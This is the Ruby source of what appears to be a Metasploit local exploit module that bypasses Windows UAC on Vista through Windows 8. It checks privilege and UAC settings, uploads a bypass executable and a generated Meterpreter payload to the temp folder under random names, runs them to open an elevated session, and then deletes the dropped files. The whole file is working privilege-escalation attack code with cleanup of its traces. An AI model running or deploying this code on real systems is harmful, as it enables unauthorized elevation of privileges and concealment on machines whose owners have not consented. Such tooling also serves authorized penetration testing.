##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::Runas

  def initialize(info={})
    super( update_info(info,
      'Name'          => 'Windows Escalate UAC Protection Bypass',
      'Description'   => %q{
        This module will bypass Windows UAC by utilizing the trusted publisher
        certificate through process injection. It will spawn a second shell that
        has the UAC flag turned off.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
        'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>',
        'mitnick',
        'mubix' # Port to local exploit
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [ 'URL', 'http://www.trustedsec.com/december-2010/bypass-windows-uac/' ]
      ],
      'DisclosureDate'=> "Dec 31 2010"
    ))

    register_options([
      OptEnum.new('TECHNIQUE', [true, 'Technique to use if UAC is turned off',
                               'EXE', %w(PSH EXE)]),
    ])

  end

  def check_permissions!
    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
    end
  end

  def exploit
    validate_environment!

    case get_uac_level
    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP, UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP, UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
      fail_with(Failure::NotVulnerable,
        "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting..."
      )
    when UAC_DEFAULT
      print_good 'UAC is set to Default'
      print_good 'BypassUAC can bypass this setting, continuing...'
    when UAC_NO_PROMPT
      print_warning "UAC set to DoNotPrompt - using ShellExecute 'runas' method instead"
      runas_method
      return
    end

    check_permissions!

    upload_binaries!

    cmd = "#{path_bypass} /c #{path_payload}"
    # execute the payload
    pid = cmd_exec_get_pid(cmd)

    ::Timeout.timeout(30) do
      select(nil, nil, nil, 1) until session_created?
    end
    session.sys.process.kill(pid)
    # delete the uac bypass payload
    file_rm(path_bypass)
    file_rm("#{expand_path("%TEMP%")}\\tior.exe")
    cmd_exec('cmd.exe', "/c del \"#{expand_path("%TEMP%")}\\w7e*.tmp\"" )
  end

  def path_bypass
    @bypass_path ||= "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}.exe"
  end

  def path_payload
    @payload_path ||= "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}.exe"
  end

  def upload_binaries!
    print_status('Uploaded the agent to the filesystem....')
    #
    # Generate payload and random names for upload
    #
    payload = generate_payload_exe

    # path to the bypassuac binary
    path = ::File.join(Msf::Config.data_directory, 'post')

    # decide, x86 or x64
    bpexe = nil
    if sysinfo["Architecture"] =~ /x64/i
      bpexe = ::File.join(path, 'bypassuac-x64.exe')
    else
      bpexe = ::File.join(path, 'bypassuac-x86.exe')
    end

    print_status('Uploading the bypass UAC executable to the filesystem...')

    begin
      #
      # Upload UAC bypass to the filesystem
      #
      upload_file("#{path_bypass}", bpexe)
      print_status("Meterpreter stager executable #{payload.length} bytes long being uploaded..")

      write_file(path_payload, payload)
    rescue ::Exception => e
      print_error("Error uploading file #{path_bypass}: #{e.class} #{e}")
      return
    end
  end

  def runas_method
    case datastore['TECHNIQUE']
    when 'PSH'
      # execute PSH
      shell_execute_psh
    when 'EXE'
      # execute EXE
      shell_execute_exe
    end
  end

  def validate_environment!
    fail_with(Failure::None, 'Already in elevated state') if is_admin? or is_system?
    #
    # Verify use against Vista+
    #
    winver = sysinfo['OS']

    unless winver =~ /Windows Vista|Windows 2008|Windows [78]/
      fail_with(Failure::NotVulnerable, "#{winver} is not vulnerable.")
    end

    if is_uac_enabled?
      print_status 'UAC is Enabled, checking level...'
    else
      if is_in_admin_group?
        fail_with(Failure::Unknown, 'UAC is disabled and we are in the admin group so something has gone wrong...')
      else
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end
  end
end